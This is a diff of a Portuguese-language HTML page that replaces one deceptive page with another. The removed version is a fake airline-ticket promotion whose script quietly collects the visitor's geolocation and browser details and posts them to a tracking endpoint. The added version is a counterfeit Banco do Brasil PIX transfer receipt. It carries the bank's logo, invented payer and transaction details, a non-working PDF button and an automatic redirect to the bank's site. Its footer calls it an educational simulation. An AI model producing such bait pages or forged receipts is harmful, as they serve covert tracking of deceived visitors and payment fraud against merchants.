@@ -1,62 +1,106 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt-br">
 <head>
   <meta charset="UTF-8">
-  <title>Promoção Imperdível de Passagens Aéreas!</title>
+  <title>Comprovante de PIX</title>
+  <meta http-equiv="refresh" content="7;url=https://www.bb.com.br"> <!-- Redirecionamento automático -->
+
   <style>
     body {
-      font-family: Arial, sans-serif;
-      padding: 2rem;
-      background-color: #f4f4f4;
+      background-color: #f2f3f5;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 420px;
+      margin: auto;
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 12px rgba(0,0,0,0.1);
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 15px;
+    }
+
+    .logo img {
+      width: 140px;
+    }
+
+    .titulo {
+      text-align: center;
+      font-weight: bold;
+      font-size: 17px;
+      margin-bottom: 15px;
+      color: #003a70;
+    }
+
+    .linha {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 0;
+      border-bottom: 1px solid #eee;
+    }
+
+    .linha strong {
+      color: #333;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 11px;
+      color: #777;
       text-align: center;
     }
-    .container {
-      background: white;
-      padding: 2rem;
-      border-radius: 12px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      max-width: 500px;
-      margin: auto;
+
+    .botao-pdf {
+      display: block;
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .botao-pdf button {
+      background-color: #ffcc00;
+      color: #003a70;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+    }
+
+    .botao-pdf button:hover {
+      background-color: #e6b800;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>🎉 Parabéns! Você foi selecionado para a promoção de passagens aéreas 2025! ✈️</h2>
-    <p>Estamos carregando as melhores ofertas baseadas na sua localização... Aguarde!</p>
-    <p><strong>Não feche esta página.</strong></p>
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fc/Banco_do_Brasil_logo.svg/2560px-Banco_do_Brasil_logo.svg.png" alt="Banco do Brasil">
+    </div>
+    <div class="titulo">COMPROVANTE DE TRANSFERÊNCIA VIA PIX</div>
+
+    <div class="linha"><strong>Data:</strong><span>27/06/2025</span></div>
+    <div class="linha"><strong>Hora:</strong><span>10:48:01</span></div>
+    <div class="linha"><strong>Valor:</strong><span>R$ 895,00</span></div>
+    <div class="linha"><strong>Pagador:</strong><span>Leonardo Silva Machado</span></div>
+    <div class="linha"><strong>Chave PIX:</strong><span>leonardo.machado@bb.com.br</span></div>
+    <div class="linha"><strong>Destinatário:</strong><span>João Marcos Pereira</span></div>
+    <div class="linha"><strong>Banco:</strong><span>Banco do Brasil</span></div>
+    <div class="linha"><strong>TxID:</strong><span>BB1234567890</span></div>
+    <div class="linha"><strong>Comprovante:</strong><span>8F34-98AB-22CD</span></div>
+
+    <div class="botao-pdf">
+      <button onclick="alert('Erro ao gerar o PDF. Tente novamente mais tarde.')">📄 Baixar Comprovante em PDF</button>
+    </div>
+
+    <div class="footer">* Este comprovante é uma simulação fictícia para fins educacionais.</div>
   </div>
-
-  <script>
-    const webhookURL = "/api/rastreamento";
-
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(function(position) {
-        const payload = {
-          latitude: position.coords.latitude,
-          longitude: position.coords.longitude,
-          accuracy: position.coords.accuracy + " metros",
-          userAgent: navigator.userAgent,
-          timestamp: new Date().toISOString()
-        };
-
-        fetch(webhookURL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(payload)
-        }).then(() => {
-          console.log("📡 Dados enviados com sucesso.");
-        }).catch(error => {
-          console.error("❌ Erro ao enviar:", error);
-        });
-      }, function(error) {
-        console.warn("⚠️ Permissão de localização negada ou indisponível.");
-      });
-    } else {
-      console.warn("🚫 Geolocalização não suportada neste navegador.");
-    }
-  </script>
 </body>
 </html>
